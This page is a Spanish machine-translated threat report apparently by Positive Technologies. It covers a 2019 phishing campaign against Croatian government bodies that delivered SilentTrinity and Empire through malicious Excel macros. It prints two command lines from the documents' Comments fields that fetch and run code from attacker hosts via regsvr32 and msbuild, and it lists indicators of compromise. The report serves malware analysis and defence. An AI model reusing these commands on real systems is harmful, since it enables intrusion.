<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üê© ü•É üèúÔ∏è IronPython del lado del mal: c√≥mo descubrimos un ciberataque a los servicios p√∫blicos en un pa√≠s europeo üõê üë©üèæ‚ÄçüöÄ üë∂üèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Nuestros expertos del centro de seguridad experto siempre se mantienen actualizados y monitorean la aparici√≥n de nuevas amenazas interesantes y peligr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>IronPython del lado del mal: c√≥mo descubrimos un ciberataque a los servicios p√∫blicos en un pa√≠s europeo</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/458766/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="imagen"></a> <br><br>  Nuestros expertos del centro de seguridad experto siempre se mantienen actualizados y monitorean la aparici√≥n de nuevas amenazas interesantes y peligrosas.  As√≠ es como, a principios de abril de 2019, se descubri√≥ un ataque selectivo contra el gobierno croata.  Este informe examin√≥ la cadena de entrega de malware a la computadora de la v√≠ctima, present√≥ indicadores de compromiso y se√±al√≥ el uso de un nuevo marco postoperatorio que, seg√∫n nuestros datos, nunca ha sido utilizado por los atacantes. <a name="habracut"></a><br><br><h2>  Infecci√≥n de la v√≠ctima </h2><br>  El 2 de abril de 2019, durante un monitoreo de rutina de varios recursos para detectar nuevo malware, los expertos de PT Expert Security Center descubrieron un documento inusual de la oficina. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/719/16e/e61/71916ee61f47e529490f3da0ca0db121.png" alt="imagen"><br><br>  <i>Figura 1. Documento malicioso</i> <br><br>  La notificaci√≥n de env√≠o se cre√≥ en la aplicaci√≥n de Office MS Excel y se guard√≥ en el formato XLS anterior un d√≠a antes (2019-04-01 16:28:07 (UTC)).  Sin embargo, la marca de tiempo disponible en la prensa (2018-07-25 00:12:30 (UTC)) indica que el documento se us√≥ en 2018.  Volveremos a este s√≠ntoma indirecto a continuaci√≥n. <br><br>  Es de destacar que el campo Comentarios (que se puede cambiar, incluido el uso de la aplicaci√≥n MS Excel) contiene un comando en el shell de Windows: <br><br><pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>): objShell.Run <span class="hljs-string"><span class="hljs-string">"net use https://postahr.vip"</span></span>, 0, False: Wscript.Sleep 10000: objShell.Run <span class="hljs-string"><span class="hljs-string">"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"</span></span>, 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/557/a53/082/557a53082352f47cc4c079305408a7cc.png" alt="imagen"><br><br>  <i>Figura 2. El campo "Comentarios" con contenido sospechoso</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a93/f80/6e8/a93f806e8dca3dfb1a81ee0da457da95.png" alt="imagen"><br><br>  <i>Figura 3. El contenido del campo Comentarios en forma binaria</i> <br><br>  Como resultado de ejecutar este comando, el sistema crea un script en el lenguaje Visual Basic que, cuando se inicia, realizar√° las siguientes acciones: <br><br><ul><li>  conectar un recurso de red utilizando la tecnolog√≠a WebDAV, </li><li>  descargue y ejecute el archivo de la siguiente etapa de infecci√≥n utilizando la utilidad leg√≠tima del sistema regsvr32. </li></ul><br>  Cuando se conecta un recurso de red a trav√©s de HTTP (S), se env√≠a una solicitud NTLM al servidor atacante, con la ayuda de la cual se puede restaurar el hash NTLM.  Luego, el hash recibido se puede usar para la autorizaci√≥n de los servicios en nombre de la v√≠ctima.  No encontramos rastros de tales ataques, y las razones para conectar un recurso de red siguen sin estar claras. <br><br>  La t√©cnica de usar regsvr32 (gesti√≥n de controles ActiveX) con fines maliciosos no es nueva e incluso tiene un nombre: Squiblydoo.  Los atacantes lo usan para cumplir con los requisitos para controlar el lanzamiento de programas confiables, as√≠ como para evitar la detecci√≥n de antivirus. <br><br>  Por s√≠ mismo, el texto en el campo Comentarios es inofensivo y su ejecuci√≥n debe estar condicionada de alguna manera.  Cuando la v√≠ctima abre el documento Excel recibido, aparece un mensaje de trampa en idioma croata que le indica que incluya macros: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/97d/8a4/b5a/97d8a4b5a0406ebef6d02ea3c8b1b994.png" alt="imagen"><br><br>  <i>Figura 4. Mensaje de captura despu√©s de abrir un documento</i> <br><br>  Si se permiten macros, el usuario ver√° una notificaci√≥n de paquete falso con el logotipo postal croata: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d64/2d3/1e2/d642d31e23e0d4fa7ca34dc652ad522b.png" alt="imagen"><br><br>  <i>Figura 5. Notificaci√≥n de paquete falso</i> <br><br>  Mientras tanto, utilizando las herramientas de macro, se ejecutar√° el script para el campo Comentarios y el script creado en el sistema se agregar√° al inicio: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/678/7ab/4aa/6787ab4aab57ef3ad22b190c2474f8c5.png" alt="imagen"><br><br>  <i>Figura 6. Macro l√≥gica clave</i> <br><br>  Curiosamente, el script que se est√° creando no es activado por una macro.  Quiz√°s esta sea la intenci√≥n del atacante: la siguiente etapa de infecci√≥n ocurrir√° despu√©s de un reinicio del sistema y el inicio de sesi√≥n del usuario.  Volveremos a este detalle a continuaci√≥n. <br><br>  Parte del escenario es interesante a su manera: una estructura de c√≥digo ordenada con formato, sangr√≠a y otros matices de marcado puede ser una se√±al de uso de c√≥digo de terceros e incluso un programa que le permite crear dichos documentos autom√°ticamente. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ba4/e7c/2cc/ba4e7c2ccb1eeb9bb4a2de8dbf8dda13.png" alt="imagen"><br><br>  <i>Figura 7. Parte presumiblemente prestada de la macro</i> <br><br>  La b√∫squeda de palabras clave proporciona muchas piezas de c√≥digo similares en diferentes recursos.  Nos inclinamos a creer que el hacker simplemente encontr√≥ el c√≥digo de programa apropiado y lo ajust√≥ un poco para realizar las acciones que necesitaba: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/899/608/9fc/8996089fca65afdf132c69c6d943a6fa.png" alt="imagen"><br><br>  <i>Figura 8. Ejemplo de una macro similar en issuu.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fa5/c22/3f6/fa5c223f681efa6950cb71067f26c877.png" alt="imagen"><br><br>  <i>Figura 9. Un ejemplo de una macro similar en stackoverflow.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1dd/bdb/f59/1ddbdbf592989692bc8d15712f638f37.png" alt="imagen"><br><br>  <i>Figura 10. Ejemplo de una macro similar en dummies.com</i> <br><br>  Regresemos a la siguiente etapa de infecci√≥n utilizando la utilidad regsvr32.  Cuando se ejecuta el comando, el scriptlet update.sct en JavaScript se descargar√° del servidor del atacante.  El cuerpo del script contiene datos binarios codificados por el algoritmo Base64.  Despu√©s de la decodificaci√≥n, los datos recibidos ser√°n deserializados y ejecutados usando la plataforma de software .NET Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e0/d7d/9f8/0e0d7d9f8b6324b3aadce5a203d28075.png" alt="imagen"><br><br>  <i>Figura 11. El script update.sct descargado del servidor del atacante</i> <br><br>  Vale la pena se√±alar que este c√≥digo tambi√©n fue prestado por el atacante en uno de los recursos p√∫blicos: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b26/b9c/673/b26b9c673c0aace886123fc47b3d70c4.png" alt="imagen"><br><br>  <i>Figura 12. Un ejemplo de c√≥digo similar en rastamouse.me</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/25e/5ec/aef/25e5ecaeff7cebf201d5781fb8423ddc.png" alt="imagen"><br><br>  <i>Figura 13. Un ejemplo de c√≥digo similar en github.com</i> <br><br>  No parece que el hacker haya profundizado cuidadosamente en la l√≥gica de las herramientas utilizadas.  Por ejemplo, en el scriptlet considerado, se llama a la funci√≥n setversion, que no hace nada.  Tambi√©n se ve un ejemplo disponible en la web. <br><br>  El objeto desempaquetado y lanzado es un archivo PE ejecutable en la plataforma .NET. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/20f/274/650/20f274650305046ab50359cd089a517d.png" alt="imagen"><br><br>  <i>Figura 14. El encabezado del archivo PE ejecutable</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/cf6/946/d54/cf6946d543b6b8a02f79bc06b3470d7e.png" alt="imagen"><br><br>  <i>Figura 15. Informaci√≥n de depuraci√≥n del archivo SharpPick PE</i> <br><br>  Como resultado de la compilaci√≥n, se conserv√≥ la ruta al proyecto con el c√≥digo fuente.  El sufijo -master indica que el proyecto se clon√≥ previamente desde el repositorio, y el directorio SharpPick conduce a una aplicaci√≥n bien conocida que le permite descargar y ejecutar el c√≥digo de PowerShell sin usar el int√©rprete de idiomas directamente, pero usando dependencias .NET. <br>  A pesar de la disponibilidad del proyecto de utilidad SharpPick en GitHub, debe asegurarse de que no se hayan realizado cambios significativos. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/300/f5f/689/300f5f689737fae0872ddaaaec6d5fbc.png" alt="imagen"><br><br>  <i>Figura 16. Parte del c√≥digo de utilidad SharpPick descompilado</i> <br><br>  Como resultado de la descompilaci√≥n, se obtuvo un pseudoc√≥digo, durante el cual se decodifica desde Base64 y se inicia el script de PowerShell: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fd7/9c0/dae/fd79c0dae768b4bc3e6bd8916b871c4a.png" alt="imagen"><br><br>  <i>Figura 17. Script de PowerShell parcialmente convertido</i> <br><br>  Despu√©s de simplificar el c√≥digo, no es dif√≠cil analizar su l√≥gica: <br><br><ul><li>  se forma un objeto para interactuar con el servidor web con la configuraci√≥n especificada de Agente de usuario, Cookie y proxy; </li><li>  la carga √∫til se carga en la direcci√≥n especificada; </li><li>  el algoritmo RC4 descifra el resultado utilizando la clave especificada y se inicia. </li></ul><br>  Desafortunadamente, durante nuestra investigaci√≥n, el servidor de administraci√≥n ya no estaba disponible.  No pudimos encontrar los datos que recibi√≥ de √©l anteriormente.  Sin embargo, esta vez hay suficiente informaci√≥n en la Web (ejemplo: informe de nuestros colegas de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://www.google.com/url%3Fq%3D">FireEye</a> ) para establecer sin ambig√ºedades: el eslab√≥n final en esta cadena de infecci√≥n es Empire backdoor, una herramienta para la administraci√≥n remota de la computadora de la v√≠ctima como parte del marco posoperativo Empire Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b7e/a88/eab/b7ea88eab8ddfb21880d2f2a8b04f51d.png" alt="imagen"><br><br>  <i>Figura 18. Uso de un script similar de PowerShell para atacar vulnerabilidades en WinRAR</i> <br><br>  Curiosamente, otros patrones de script conducen a un extenso art√≠culo sobre t√©cnicas de prueba de penetraci√≥n con especial atenci√≥n a ocultar la infraestructura de los atacantes detr√°s de los servidores proxy.  La fuente m√°s probable de informaci√≥n utilizada por el atacante es un art√≠culo de colegas de Payatu Technologies, donde <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://www.google.com/url%3Fq%3D">proporcionan</a> instrucciones detalladas sobre la redirecci√≥n de sesiones a recursos leg√≠timos, el bloqueo de paquetes no deseados, el registro, etc., incluido el uso de Empire. <br><br>  Unas horas despu√©s, encontramos otro documento en el paquete.  Tiene muchas similitudes con la anterior: tambi√©n se encuentra en Croacia (2019-04-02 16:52:56 (UTC)), tiene el mismo nombre e incluso una imagen de trampa sobre el paquete recibido.  Pero a√∫n hay diferencias. <br><br>  El c√≥digo malicioso se encuentra nuevamente en el campo Comentarios, pero esta vez la l√≥gica de las acciones ha cambiado. <br><br><pre> <code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>):objShell.Run <span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe /c net use \\176.105.255.59\webdav"</span></span>,0:Wscript.Sleep 60000: objShell.Run <span class="hljs-string"><span class="hljs-string">"%windir%\Microsoft.Net\Framework\v4.0.30319\msbuild.exe \\176.105.255.59\webdav\msbuild.xml"</span></span> , 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><ul><li>  El recurso de red se conecta mediante el protocolo SMB. </li><li>  Descargue e inicie la siguiente etapa de infecci√≥n utilizando msbuild, una utilidad leg√≠tima del paquete .NET Framework. </li></ul><br>  Es interesante que la l√≠nea webdav est√© presente en la direcci√≥n del directorio montado, vinculando indirectamente este caso con el anterior.  Esta vez, todav√≠a es posible un ataque al hash NTLM, aunque no hay evidencia de su uso.  Una vez m√°s, se utiliza una aplicaci√≥n leg√≠tima (esta vez msbuild) para evitar con √©xito la restricci√≥n en el lanzamiento de programas de terceros.  Antes de describir la t√©cnica de abuso, mencionamos las diferencias en el c√≥digo del programa de la macro de un nuevo documento. <br><br>  Los atacantes no hicieron cambios significativos en la l√≥gica del script VBA.  Pero vale la pena se√±alar que esta vez no solo proporcionan la carga autom√°tica del script VBS creado en el sistema, sino que tambi√©n lo inician cuando se abre el documento.  Lo m√°s probable es que, en el caso anterior, los atacantes simplemente lo olvidaron y, despu√©s de un tiempo, al descubrir un error, lo corrigieron en la nueva versi√≥n del documento. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/77d/670/2b3/77d6702b3bc07650a4f462b62cf975fd.png" alt="imagen"><br><br>  <i>Figura 19. Comparaci√≥n del c√≥digo macro en dos documentos</i> <br><br>  La siguiente etapa de infecci√≥n es un documento XML que contiene c√≥digo C #.  Una caracter√≠stica de la utilidad msbuild le permite compilar y ejecutar el c√≥digo contenido sobre la marcha, como lo demuestran los comentarios que dej√≥ el hacker al comienzo del marcado. <br><br>  El b√∫fer Base64 se presenta nuevamente en el c√≥digo, que ser√° descodificado, descomprimido por el algoritmo Deflate y lanzado.  Creemos que el lector ya se da cuenta de que esta vez el atacante tambi√©n utiliz√≥ una plantilla de acceso libre, como lo demuestran los comentarios mencionados y muchas fuentes en la Web con el mismo c√≥digo. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d68/6ea/4ac/d686ea4acff8cb52067c0c53cb6bf749.png" alt="imagen"><br><br>  <i>Figura 20. La tarea msbuild.xml descargada del servidor atacante</i> <br><br>  Como resultado, esta vez se cargar√° un archivo PE en la plataforma .NET y se ejecutar√° en la memoria.  Y la informaci√≥n de depuraci√≥n contiene no solo una se√±al de que el proyecto se recopil√≥ en una m√°quina virtual (posiblemente para ocultar informaci√≥n sobre el atacante), sino tambi√©n el directorio SILENTTRINITY, en el que nos detendremos con m√°s detalle. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/adf/3fe/653/adf3fe65355eb2c7418a5438afc5aa34.png" alt="imagen"><br><br>  <i>Figura 21. Informaci√≥n de depuraci√≥n del archivo SILENTTRINITY PE</i> <br><br>  Despu√©s de estudiar estos dos documentos de paquete, encontramos dos m√°s.  Tanto el formato de archivo, el nombre y la imagen de captura con la regi√≥n especificada no se modificaron.  Los documentos estaban disponibles a fines de agosto de 2018, lo que confirma la hip√≥tesis sobre la naturaleza a largo plazo de la campa√±a, sobre la que escribimos al comienzo del informe. <br><br>  Es curioso que el a√±o pasado los hackers no utilizaron el campo "Comentarios", pero lanzaron utilidades leg√≠timas.  El componente malicioso se carg√≥ utilizando la utilidad para trabajar con certificados y operaciones criptogr√°ficas certutil, y el lanzamiento fue proporcionado por las herramientas de administraci√≥n del sistema WMI: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95b/f2f/5a9/95bf2f5a9dc3693dd275bc9153e2a364.png" alt="imagen"><br><br>  <i>Figura 22. Comparaci√≥n de macros de documentos de 2018</i> <br><br>  Desafortunadamente, despu√©s de la limitaci√≥n de lo que sucedi√≥, no pudimos establecer los enlaces posteriores en la cadena de ataque de 2018. <br><br>  Tambi√©n vale la pena se√±alar que parte del c√≥digo del script VBA se mantuvo sin cambios, con la excepci√≥n de los comentarios auxiliares eliminados que explican la l√≥gica del trabajo. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ef4/16b/9ee/ef416b9ee48a47b9795cf24db66b7555.png" alt="imagen"><br><br>  <i>Figura 23. Comparaci√≥n de las macros de 2019 y 2018</i> <br><br><h2>  SilentTrinity Framework </h2><br>  Los resultados de b√∫squeda para la palabra clave SILENTTRINITY de la informaci√≥n de depuraci√≥n del archivo PE pueden determinar f√°cilmente el origen de este enlace de ataque.  En octubre de 2018, Marcello Salvati (investigador de Black Hills Information Security) public√≥ un proyecto llamado SILENTTRINITY en el popular repositorio de GitHub.  La idea principal: utilizar la flexibilidad y las ventajas del conocido marco de PowerShell posoperativo en el lenguaje de programaci√≥n Python Python, concretamente IronPython.  El proyecto se est√° desarrollando hasta el d√≠a de hoy. <br><br>  No profundizaremos en los detalles del trabajo y la implementaci√≥n del proyecto (especialmente porque el autor habl√≥ en detalle al respecto en su <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://www.google.com/url%3Fq%3D">informe</a> ).  Solo destacaremos la l√≥gica b√°sica del trabajo y los puntos interesantes en la implementaci√≥n. <br><br>  Despu√©s de iniciar el archivo PE (sin embargo, el enlace intermedio puede estar en un formato diferente), ocurre lo siguiente: <br><br><ul><li>  acceso al servidor de administraci√≥n para descargar el archivo ZIP con las dependencias necesarias y el script principal de Python; </li><li>  el contenido del archivo se extrae sin guardarlo en el disco; </li><li>  las dependencias se registran para el procesamiento exitoso de los scripts de Python; </li><li>  Se inicia el script principal de Python, esperando la tarea del atacante; </li><li>  cada tarea se transfiere como un script Python listo para usar; </li><li>  la tarea se realiza en el lado de la v√≠ctima en un hilo separado; </li><li>  El resultado del trabajo se transfiere nuevamente al servidor de administraci√≥n. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/ed9/250/ca2/ed9250ca2557c5f70ff18d60c33f1b31.png" alt="imagen"><br><br>  <i>Figura 24. Diagrama de funcionamiento del marco de SilentTrinity</i> <br><br>  De las caracter√≠sticas cabe destacar las siguientes: <br><br><ul><li>  Compatibilidad con IronPython, incluido el lenguaje Boo (un subconjunto de IronPython con una fuerte tipificaci√≥n de datos). </li><li>  Toda la actividad no requiere espacio en disco: dependencias, scripts, tareas se encuentran en la memoria (ataque sin archivos). </li><li>  Archivo con dependencias, tareas, el resultado del trabajo de los equipos: toda la comunicaci√≥n entre la v√≠ctima y el hacker est√° encriptada con el algoritmo AES. </li><li>  La clave compartida es generada por el protocolo Diffie-Hellman. </li><li>  El transporte de red se proporciona a nivel del protocolo HTTP (S) con soporte de proxy. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="imagen"><br><br>  <i>Figura 25. Ejemplo de interfaz de usuario del lado del servidor del marco SilentTrinity</i> <br><br>  Curiosamente, el d√≠a de los ataques, el cargador PE se carg√≥ en el servicio VirusTotal, donde ning√∫n proveedor de antivirus lo identific√≥ como malicioso.  Esto no es sorprendente: en primer lugar, el archivo binario no llega al disco y la detecci√≥n de firma no tiene mucho sentido;  en segundo lugar, la detecci√≥n est√°tica est√° lejos de ser la √∫nica tecnolog√≠a para proteger a los usuarios. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d24/126/15c/d2412615ccb6eadccf22c7bec91aa7ec.png" alt="imagen"><br><br>  <i>Figura 26. Resultado del an√°lisis del gestor de arranque SilentTrinity el d√≠a del ataque</i> <br><br>  Adem√°s, unos d√≠as despu√©s del ataque, los veredictos de detecci√≥n a√∫n comenzaron a aparecer.  Es importante que durante el per√≠odo de los ataques, o el equipo de protecci√≥n a√∫n no estaba equipado con algoritmos de detecci√≥n, o la amenaza no se conoc√≠a en principio. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e6e/3f2/9d9/e6e3f29d93ff8aa9053c3e7dc4ac30ce.png" alt="imagen"><br><br>  <i>Figura 27. El resultado del an√°lisis actual del gestor de arranque SilentTrinity</i> <br><br>  Lo m√°s probable es que esta fue la raz√≥n para elegir esta soluci√≥n para realizar ataques.  No tenemos informaci√≥n de que el marco de SilentTrinity ya se haya utilizado antes en ataques maliciosos. <br><br>  Infraestructura utilizada por los atacantes <br><br>  Vale la pena mencionar que la infraestructura de red utilizada por los hackers est√° cronol√≥gicamente relacionada con los ataques en curso. <br><br><img src="https://habrastorage.org/webt/9u/uq/ug/9uuqugtgx2tbnobx9tjhadnbldk.png"><br><br>  <i>Tabla 1. Informaci√≥n sobre los dominios utilizados como servidores de ataque</i> <i><br></i> <br><br>  Los dominios se crearon de tal manera que se asemejan a recursos leg√≠timos atacados.  Esto permite a los usuarios ganar confianza en los ataques de phishing.  Tenga en cuenta que los recursos involucrados no se limitan a Croacia. <br><br>  Todos los dominios se registran utilizando la tecnolog√≠a de seguridad WhoisGuard.  Le permite ocultar la informaci√≥n real sobre el registrante del dominio para protegerse contra el correo no deseado, mientras que los atacantes usan esta tecnolog√≠a para el anonimato. <br><br>  Los servidores que distribuyen y administran malware fueron arrendados al proveedor holand√©s Breezle. <br><br>  Toda la informaci√≥n disponible sobre los nodos, direcciones y dominios de los atacantes con muchas conexiones entre ellos nos permite juzgar sobre los grandes vol√∫menes de malware que los atacantes ten√≠an esta vez.  No excluimos que en la campa√±a se puedan utilizar herramientas similares a las consideradas y que algunos casos de infecci√≥n no se hayan resuelto. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/88d/308/4a4/88d3084a4fdcc666d13cb22d0f7ca88a.png" alt="imagen"><br><br>  <i>Figura 28. Representaci√≥n gr√°fica de la infraestructura de un atacante.</i> <br><br><h2>  Conclusi√≥n </h2><br>  Un d√≠a despu√©s del descubrimiento de los documentos en las <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://www.google.com/url%3Fq%3D">noticias</a> , se emiti√≥ un comunicado de prensa con un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=https://www.google.com/url%3Fq%3D">enlace</a> al Departamento de Seguridad de Sistemas de Informaci√≥n de Croacia sobre ataques de phishing selectivos.  Se encontraron rastros en varios organismos gubernamentales del pa√≠s.  Se informa que se enviaron correos electr√≥nicos a las v√≠ctimas con un enlace a un sitio de phishing desde el que se propuso descargar un documento malicioso desde el cual comenz√≥ nuestro an√°lisis.  Esto llena los eslabones perdidos en la cadena de ataque, y al final nos gustar√≠a prestar atenci√≥n a los m√©todos de protecci√≥n que pueden reducir el da√±o de tales ataques: <br><br><ul><li>  Monitoreo y control del uso de algunos programas confiables (certutil, regsvr32, msbuild, net, wmic ...) </li><li>  Verificaci√≥n y an√°lisis no solo de archivos adjuntos en correos electr√≥nicos, sino tambi√©n de enlaces web </li><li>  Escaneos peri√≥dicos de la memoria de la PC en una red corporativa </li><li>  Las conexiones exitosas a C2 Silent Trinity (incluso bajo TLS) se pueden detectar utilizando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PT Network Attack Discovery</a> , adem√°s, en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">nuestro repositorio publicamos detecciones para la comunidad.</a> </li></ul><br>  <b>Publicado por</b> Alexey Vishnyakov, Tecnolog√≠as positivas <br><br>  PD: Sobre este tema, el autor tambi√©n ley√≥ un informe en Positive Hack Days 9. El video de esta y otras presentaciones est√° disponible en: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.phdays.com/en/broadcast/</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Indicadores de compromiso:</b> <div class="spoiler_text">  0adb7204ce6bde667c5abd31e4dea164 <br>  13db33c83ee680e0a3b454228462e73f <br>  78184cd55d192cdf6272527c62d2ff89 <br>  79e72899af1e50c18189340e4a1e46e0 <br>  831b08d0c650c8ae9ab8b4a10a199192 <br>  92530d1b546ddf2f0966bbe10771521f <br>  c84b7c871bfcd346b3246364140cd60f <br>  hxxps: //postahr.vip/page/1/update.sct <br>  hxxps: //posteitaliane.live/owa/mail/archive.srf <br>  hxxps: //konzum.win/bat3.txt <br>  hxxp: //198.46.182.158/bat3.txt <br>  hxxps: //176.105.255.59: 8089 <br>  [\\] 176.105.255.59 \ webdav \ msbuild.xml <br>  postahr.online <br>  176.105.254.52 <br>  93.170.105.32 </div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/458766/">https://habr.com/ru/post/458766/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../458754/index.html">GPS para escarabajo de esti√©rcol: sistema de orientaci√≥n multimodal</a></li>
<li><a href="../458756/index.html">C√≥mo aprendimos a manejar los datos con GoPractice Simulator</a></li>
<li><a href="../458758/index.html">El esplendor y la pobreza de la literatura traducida.</a></li>
<li><a href="../458760/index.html">La exposici√≥n de Las Vegas es para desarrolladores de electr√≥nica, no para consumidores. Un informe de la conferencia de automatizaci√≥n de dise√±o</a></li>
<li><a href="../458764/index.html">Pr√°cticas √°giles b√°sicas para equipos t√©cnicos y no t√©cnicos en 2019</a></li>
<li><a href="../458768/index.html">5-6 razones para venir a GolangConf</a></li>
<li><a href="../458770/index.html">Toda la verdad sobre RTOS. Art√≠culo # 29. Interrupciones en el n√∫cleo SE</a></li>
<li><a href="../458774/index.html">DBMS funcional</a></li>
<li><a href="../458778/index.html">Satellite 6.5 Reporting Engine: qu√© y por qu√©</a></li>
<li><a href="../458782/index.html">Adaptaci√≥n de programas para ZX Spectrum a TR-DOS por medios modernos. Parte 3</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
